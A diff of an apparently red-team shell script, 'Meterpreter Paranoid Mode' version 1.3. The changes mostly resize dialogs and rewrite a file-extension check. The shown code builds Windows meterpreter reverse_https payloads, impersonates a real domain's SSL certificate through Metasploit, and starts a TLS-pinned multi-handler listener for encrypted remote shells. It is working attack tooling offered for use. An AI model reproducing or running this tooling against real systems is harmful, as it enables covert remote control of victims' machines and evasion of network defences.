@@ -1,7 +1,7 @@
 #!/bin/sh
 ##
 # Meterpreter Paranoid Mode - SSL/TLS connections
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.2
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.3
 # Distros Supported : Linux Kali, Mint, Ubuntu
 # Suspicious-Shell-Activity (SSA) RedTeam dev @2017
 # ---
@@ -204,7 +204,7 @@ read OP
 #
 # Build PEM certificate (manual or impersonate)
 #
-cHos=$(zenity --list --title "☠ CERTIFICATE BUILD ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "manual certificate" FALSE "impersonate domain" --width 300 --height 160) > /dev/null 2>&1
+cHos=$(zenity --list --title "☠ CERTIFICATE BUILD ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "manual certificate" FALSE "impersonate domain" --width 300 --height 180) > /dev/null 2>&1
 if [ "$cHos" = "manual certificate" ]; then
   #
   # SSA TEAM CERTIFICATE or your OWN (manual creation)
@@ -214,7 +214,7 @@ if [ "$cHos" = "manual certificate" ]; then
   StAtE=$(zenity --title="☠ Enter  STATE CODE ☠" --text "example: Texas" --entry --width 270) > /dev/null 2>&1
   CiTy=$(zenity --title="☠ Enter  CITY NAME ☠" --text "example: Austin" --entry --width 270) > /dev/null 2>&1
   OrGa=$(zenity --title="☠ Enter  ORGANISATION ☠" --text "example: Development" --entry --width 270) > /dev/null 2>&1
-  N4M3=$(zenity --title="☠ Enter  DOMAIN NAME ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
+  N4M3=$(zenity --title="☠ Enter  DOMAIN NAME (CN) ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
   cd $IPATH/output
   echo ${BlueF}[☠]${white} Building certificate ..${BlueF};
   openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=$CoNtRy/ST=$StAtE/L=$CiTy/O=$OrGa/CN=$N4M3" -keyout $N4M3.key -out $N4M3.crt && cat $N4M3.key $N4M3.crt > $N4M3.pem && rm -f $N4M3.key $N4M3.crt
@@ -229,10 +229,10 @@ elif [ "$cHos" = "impersonate domain" ]; then
   echo ${BlueF}[☠]${white} Input pem settings ..${Reset};
   N4M3=$(zenity --title="☠ Enter DOMAIN NAME (CN) ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
   echo ${BlueF}[☠]${white} Impersonating certificate ..${BlueF};
-  xterm -T "MPM - IMPERSONATE CERTIFICATE" -geometry 121x26 -e "msfconsole -q -x 'use auxiliary/gather/impersonate_ssl; set RHOST $N4M3; exploit; sleep 3; exit -y'"
+  xterm -T "MPM - IMPERSONATE CERTIFICATE" -geometry 124x26 -e "msfconsole -q -x 'use auxiliary/gather/impersonate_ssl; set RHOST $N4M3; exploit; sleep 3; exit -y'"
   echo "Impersonating $N4M3 RSA private key"
   sleep 1
-  echo "........................................................................................................................................................................................................"
+  echo "................................................................................................................................................................................................................................................................................................................................"
   sleep 1
   echo "Writing new private key to '$N4M3.key'"
   lOoT=`locate .msf4/loot`
@@ -261,7 +261,7 @@ fi
 #
 # Chose to build a staged (payload.bat|ps1|txt) or a stageless (payload.exe) ..
 #
-BuIlD=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.$DEFAULT_EXT)" FALSE "stageless (payload.exe)" --width 300 --height 160) > /dev/null 2>&1
+BuIlD=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.$DEFAULT_EXT)" FALSE "stageless (payload.exe)" --width 300 --height 180) > /dev/null 2>&1
 #
 # Staged payload build (batch output)
 # HINT: Edit settings file and change 'DEFAULT_EXTENSION=bat' to the extension required ..
@@ -272,7 +272,10 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   #
   # Check for NON-compatible extension (staged payloads) ..
   #
-  if [ "$DEFAULT_EXT" = "exe" ]; then
+  #if [ "$DEFAULT_EXT" = "exe" ]; then
+  if [ "$DEFAULT_EXT" = "bat" ] || [ "$DEFAULT_EXT" = "ps1" ] || [ "$DEFAULT_EXT" = "txt" ]; then
+  echo "compatible extension" > /dev/null 2>&1
+  else
     # NOT compatible payload extension found ..
     echo ${RedF}[x] Aborting script execution ..${Reset};
     echo ${RedF}[x]${white} Extension:${RedF}$DEFAULT_EXT ${white}'(Not compatible)' with ${RedF}Staged${white} payloads ..${Reset};
@@ -288,7 +291,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
     echo ${BlueF}[☠]${white} Building staged payload ..${BlueF};
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
-    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 230) > /dev/null 2>&1
+    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1
 
      #
      # Config correct payload arch selected ..
@@ -331,7 +334,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   # A staged payload would need to set the HandlerSSLCert and
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
-  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
+  xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
   sleep 2
 
 
@@ -349,7 +352,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
     echo ${BlueF}[☠]${white} Building stageless payload ..${BlueF};
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
-    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" --width 350 --height 200) > /dev/null 2>&1
+    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" --width 350 --height 220) > /dev/null 2>&1
 
      #
      # Config correct payload arch selected ..
@@ -369,7 +372,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   # A stageless payload would need to set the HandlerSSLCert and
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
-  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
+  xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set AutoRunScript $PoSt; exploit'"
   sleep 2
 
 
